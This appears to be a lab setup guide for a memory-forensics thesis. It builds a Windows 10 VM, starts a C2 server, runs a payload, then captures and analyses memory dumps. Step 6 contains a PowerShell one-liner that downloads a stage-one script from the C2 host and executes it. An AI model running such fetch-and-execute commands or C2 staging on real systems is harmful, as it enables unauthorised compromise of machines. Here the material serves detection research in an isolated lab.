# Laboratory Setup Guide — Windows 10 VM + Memory Acquisition

This guide sets up the virtual lab used in the diploma work on the Fedora host.

## Prerequisites

You need:
- Windows 10 ISO (e.g., `Win10_22H2_English_x64.iso`)
- At least 30 GB free disk space
- CPU with VT-x/AMD-V virtualization support

## Step 1: Install QEMU/KVM + virt-manager (run as root)

```bash
sudo dnf install -y qemu-kvm qemu-img libvirt virt-manager virt-install virt-viewer libguestfs-tools
sudo systemctl enable --now libvirtd
sudo usermod -aG libvirt,qemu,kvm $USER
```

**Log out and log back in** for the group changes to take effect.

Verify:
```bash
virsh list --all
```

## Step 2: Put the Windows 10 ISO

Copy your Windows 10 ISO to:

```
/home/klasnalol/repos/c2_server/lab/isos/Win10.iso
```

Or anywhere you prefer — the scripts will ask for the path.

## Step 3: Create the Windows 10 VM

### Option A: Using the helper script (CLI, no GUI needed)

```bash
cd /home/klasnalol/repos/c2_server/lab
./vm_create.sh
```

This creates a VM named `win10-forensic` with:
- 4 vCPUs, 4 GiB RAM
- 20 GB QCOW2 disk
- NAT network (reaches host at 192.168.122.1)

### Option B: Using virt-manager GUI

```bash
virt-manager
```

1. File → New Virtual Machine
2. Select "Local install media" → Browse to your ISO
3. OS: Microsoft Windows 10
4. Memory: 4096 MB, CPUs: 4
5. Storage: Create 20 GB QCOW2 disk
6. Name: `win10-forensic`
7. Finish and install Windows normally

## Step 4: Network Setup

The VM uses the default libvirt NAT network. The host (your Fedora machine) is reachable at:

```
192.168.122.1
```

The C2 server should bind to `0.0.0.0:8080` so the VM can reach it.

Verify VM can reach C2:
```powershell
# Inside Windows VM
Test-NetConnection -ComputerName 192.168.122.1 -Port 8080
```

## Step 5: Run the C2 Server

```bash
cd /home/klasnalol/repos/c2_server
./manage.sh start
./manage.sh ai-start
```

## Step 6: Execute Payload & Acquire Memory Dumps

### Inside the Windows VM

1. Open PowerShell as Administrator
2. Run:
```powershell
IEX ((New-Object Net.WebClient).DownloadString('http://192.168.122.1:8080/get/stage1_windows.ps1'))
```

3. Check the C2 dashboard — you should see callbacks.

### Acquire Memory from the Host

#### Option A: Using the dump helper script

```bash
cd /home/klasnalol/repos/c2_server/lab
./dump_memory.sh win10-forensic R1-D1-active.raw
```

This saves the dump to `dumps/R1-D1-active.raw`.

#### Option B: Manual QEMU monitor command

```bash
# Find the QEMU PID
pgrep -f "win10-forensic"

# Connect to QEMU monitor
virsh qemu-monitor-command win10-forensic --hmp "pmemsave 0 4294967296 /path/to/dump.raw"
```

For a 4 GB VM:
```bash
virsh qemu-monitor-command win10-forensic --hmp "pmemsave 0 0x100000000 /home/klasnalol/repos/c2_server/lab/dumps/R1-D1-active.raw"
```

#### Option C: Using `virsh dump` (crash dump style)

```bash
virsh dump --memory-only win10-forensic /home/klasnalol/repos/c2_server/lab/dumps/R1-D1-active.raw
```

## Step 7: Analyze the Dump

```bash
cd /home/klasnalol/repos/c2_server
./manage.sh forensic-analyze lab/dumps/R1-D1-active.raw
```

Or via the dashboard at `http://your-ip:8080/dashboard` → Forensic Analysis panel.

## Multi-Snapshot Strategy (Thesis Methodology)

Follow the thesis acquisition strategy:

| Snapshot | When to take | Purpose |
|----------|--------------|---------|
| R1-D0-baseline.raw | Before payload retrieval | Clean baseline |
| R1-D1-active.raw | Immediately after final callback | Best chance for live artifacts |
| R1-D2-persist.raw | After adding registry/WMI persistence | Persistence correlation |
| R1-D3-idle.raw | After execution completes, VM idle | Artifact survivability |

Use the helper script for each:
```bash
./dump_memory.sh win10-forensic R1-D0-baseline.raw
# ... run payload ...
./dump_memory.sh win10-forensic R1-D1-active.raw
```

## Troubleshooting

### "Could not access KVM kernel module"
```bash
sudo modprobe kvm_intel   # or kvm_amd
lsmod | grep kvm
```

### VM has no network
```bash
sudo virsh net-start default
sudo virsh net-autostart default
```

### Memory dump is truncated
Use `pmemsave` with exact memory size (check VM config).

### Permission denied on dumps directory
```bash
sudo chown -R $USER:$USER /home/klasnalol/repos/c2_server/lab/dumps
```

## Directory Structure

```
lab/
├── isos/               # Windows 10 ISO
├── vm_images/          # QCOW2 disk images
├── dumps/              # Memory dump (.raw) outputs
├── vm_create.sh        # VM creation script
├── dump_memory.sh      # Memory acquisition script
└── LAB_SETUP.md        # This file
```


## Streamlined Dump + Report (Recommended)

Use the all-in-one script. It dumps memory and prints the exact command to analyze:

```bash
cd /home/klasnalol/repos/c2_server/lab
./dump_and_report.sh R1-D1-active.raw
```

Output looks like this:
```
✅ DUMP SAVED: /home/klasnalol/repos/c2_server/lab/dumps/R1-D1-active.raw (4.2G)

==========================================
NEXT STEPS — Copy and paste one of these:
==========================================

1. ANALYZE VIA CLI:
   cd /home/klasnalol/repos/c2_server && ./manage.sh forensic-analyze lab/dumps/R1-D1-active.raw

2. ANALYZE VIA DASHBOARD:
   Open http://192.168.122.1:8080/dashboard
   Paste this path into the Forensic panel:
   /home/klasnalol/repos/c2_server/lab/dumps/R1-D1-active.raw

3. ASYNC ANALYZE WITH PROGRESS TRACKING:
   curl -X POST http://192.168.122.1:8080/forensic/analyze-async \
     -H 'Content-Type: application/json' \
     -d '{"dump_path":"/home/klasnalol/repos/c2_server/lab/dumps/R1-D1-active.raw"}'
```

## Analysis Modes

### Option A: Dashboard with Progress Bar (Recommended)

1. Open `http://192.168.122.1:8080/dashboard`
2. Scroll to **Forensic Memory Analysis**
3. Enter dump path and click **🔬 Start Async Analyze**
4. Watch the green progress bar fill up in real time
5. When complete, the **Findings** table appears with:
   - **Severity** (Critical / High / Medium / Info)
   - **What** was found (FLAG marker, C2 URL, PowerShell cmdline, etc.)
   - **Where** it was found (PID, VAD region, memory strings, etc.)
   - **Why** it's suspicious (explanation, not just a regex pattern)
   - **Manual** buttons — click **✓ Yes** or **✗ No** to label each finding

### Option B: CLI

```bash
cd /home/klasnalol/repos/c2_server
./manage.sh forensic-analyze lab/dumps/R1-D1-active.raw
```

Report saved to `forensic_output/forensic_report_YYYYMMDD_HHMMSS.json`.

### Option C: Async API with Polling

```bash
# Start analysis
curl -X POST http://192.168.122.1:8080/forensic/analyze-async \
  -H 'Content-Type: application/json' \
  -d '{"dump_path":"/home/klasnalol/repos/c2_server/lab/dumps/R1-D1-active.raw"}'

# Poll progress every 2 seconds
curl http://192.168.122.1:8080/forensic/tasks/<task_id>
```

## Manual Labeling of Forensic Findings

When a report is generated, each finding starts with **Manual** source = `fallback-regex`.

You can override any finding:

**Via Dashboard:** Click **✓ Yes** or **✗ No** next to any finding in the report table.

**Via API:**
```bash
curl -X POST http://192.168.122.1:8080/forensic/label \
  -H 'Content-Type: application/json' \
  -d '{
    "report_name": "forensic_report_20260608_143647.json",
    "finding_index": 3,
    "detected": true,
    "notes": "Confirmed via Volatility cmdline plugin",
    "analyst": "analyst"
  }'
```

Labels are stored in `logs/forensic_labels.json` and persist across restarts.

## Updated Directory Structure

```
lab/
├── isos/               # Windows 10 ISO
├── vm_images/          # QCOW2 disk images
├── dumps/              # Memory dump (.raw) outputs
├── vm_create.sh        # VM creation script
├── dump_memory.sh      # Memory acquisition script
├── dump_and_report.sh  # All-in-one dump + report streamliner
├── open_virt_manager.sh # Opens virt-manager GUI
└── LAB_SETUP.md        # This file
```
